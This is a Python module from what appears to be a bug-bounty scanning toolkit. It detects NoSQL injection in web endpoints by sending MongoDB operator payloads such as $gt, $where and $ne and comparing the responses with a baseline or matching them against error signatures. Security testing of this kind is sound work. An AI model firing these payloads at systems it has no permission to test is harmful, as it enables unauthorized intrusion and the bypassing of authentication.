#!/usr/bin/env python3
"""
nosqli.py — NoSQL injection detection (P2)
==========================================
Targets NoSQL backends (MongoDB, etc.) using:
  1. Boolean-style difference: send ``{"<param>": {"$gt": ""}}`` (body JSON)
     vs a baseline value and compare responses (a differing response implies
     the operator was interpreted).
  2. Error signatures: send operator payloads and look for Mongo/NoSQL error
     strings in the response.

Pure checkers are unit-testable; only ``test_endpoint``/``run_nosqli`` do I/O.
"""
from __future__ import annotations

import asyncio
from dataclasses import dataclass
from typing import Any

try:
    from toolkit.infra.finding import NormalizedFinding
    _HAVE_FINDING = True
except Exception:  # pragma: no cover
    _HAVE_FINDING = False


_ERROR_SIGS = ["mongoerror", "not authorized on", "$where", "cast to objectid",
               "bson", "cannot read property", "syntaxerror: unexpected",
               "mongodb", "too many keys", "bad value", "operator"]


def _detect_nosql_error(text: str) -> str:
    low = (text or "").lower()
    for s in _ERROR_SIGS:
        if s in low:
            return s
    return ""


@dataclass
class NosqlFinding:
    url: str
    method: str
    param: str
    technique: str
    payload: str
    evidence: str = ""

    def to_dict(self) -> dict:
        return self.__dict__.copy()


async def _send_json(client, endpoint: Any, payload_obj: dict, *,
                     timeout: float = 10.0) -> tuple[int, str]:
    headers = {"User-Agent": "Mozilla/5.0 (compatible; BBTK-nosql/1.0)",
               "Content-Type": "application/json"}
    try:
        r = await client.request(endpoint.method, endpoint.url, headers=headers,
                                 json=payload_obj, timeout=timeout)
        return int(getattr(r, "status_code", 0) or 0), getattr(r, "text", "") or ""
    except Exception:
        return 0, ""


async def test_endpoint(endpoint: Any, client: object, *,
                        timeout: float = 10.0) -> list[NosqlFinding]:
    params = list(getattr(endpoint, "params", []) or [])
    if not params:
        return []
    out: list[NosqlFinding] = []
    seen: set[str] = set()
    for param in params:
        # 1) boolean difference (only meaningful for JSON bodies)
        if getattr(endpoint, "inject_via", "query") == "body_json":
            base_s, base_b = await _send_json(client, endpoint, {param: "bbtk-baseline-x"},
                                              timeout=timeout)
            gt_s, gt_b = await _send_json(client, endpoint, {param: {"$gt": ""}},
                                          timeout=timeout)
            if (gt_s == base_s and gt_b != base_b and base_b) or \
               (gt_s != base_s):
                key = (param, "boolean")
                if key not in seen:
                    seen.add(key)
                    out.append(NosqlFinding(endpoint.url, endpoint.method, param,
                                            "boolean", f'{{"{param}":{{"$gt":""}}}}',
                                            "operator interpreted (response differs)"))
        # 2) error signatures (query/form value carrying operators)
        from toolkit.infra import inject
        for p in ['{"$gt":""}', '{"$where":"1==1"}', '[$ne]']:
            via = getattr(endpoint, "inject_via", "query")
            if via == "body_form":
                try:
                    r = await client.request(endpoint.method, endpoint.url,
                                             data={param: p}, timeout=timeout)
                    body = getattr(r, "text", "") or ""
                except Exception:
                    body = ""
            else:
                full = inject.build_injection_url(endpoint.url, param, p)
                try:
                    r = await client.request(endpoint.method, full, timeout=timeout)
                    body = getattr(r, "text", "") or ""
                except Exception:
                    body = ""
            sig = _detect_nosql_error(body)
            if sig:
                key = (param, "error")
                if key not in seen:
                    seen.add(key)
                    out.append(NosqlFinding(endpoint.url, endpoint.method, param,
                                            "error", p, f"NoSQL error signature '{sig}'"))
                break
    return out


async def run_nosqli(endpoints: list[Any], client: object, *,
                     timeout: float = 10.0, concurrency: int = 10) -> list[NosqlFinding]:
    sem = asyncio.Semaphore(concurrency)

    async def guarded(ep):
        async with sem:
            return await test_endpoint(ep, client, timeout=timeout)
    results = await asyncio.gather(*[guarded(ep) for ep in endpoints])
    return [f for sub in results for f in sub]


def to_normalized_findings(findings: list[NosqlFinding],
                           source_tool: str = "nosqli.py") -> list[dict]:
    out: list[dict] = []
    for f in findings:
        sev = "HIGH" if f.technique == "error" else "MEDIUM"
        detail = (f"NoSQL injection via parameter '{f.param}' ({f.method} {f.url}) "
                  f"— {f.evidence}")
        if _HAVE_FINDING:
            nf = NormalizedFinding(source_tool=source_tool, host=_host(f.url), url=f.url,
                                   vuln_class_key="NOSQL_INJECTION", severity=sev,
                                   title=f"NoSQL Injection in {f.param}",
                                   detail=detail, evidence=f"payload={f.payload}",
                                   confidence="confirmed" if f.technique == "error" else "probable")
            d = nf.to_dict()
            d["param"] = f.param
        else:
            d = {"source_tool": source_tool, "host": _host(f.url), "url": f.url,
                 "param": f.param, "vuln_class_key": "NOSQL_INJECTION", "severity": sev,
                 "title": f"NoSQL Injection in {f.param}", "detail": detail,
                 "evidence": f.payload,
                 "confidence": "confirmed" if f.technique == "error" else "probable"}
        out.append(d)
    return out


def _host(url: str) -> str:
    from urllib.parse import urlparse
    return urlparse(url).netloc
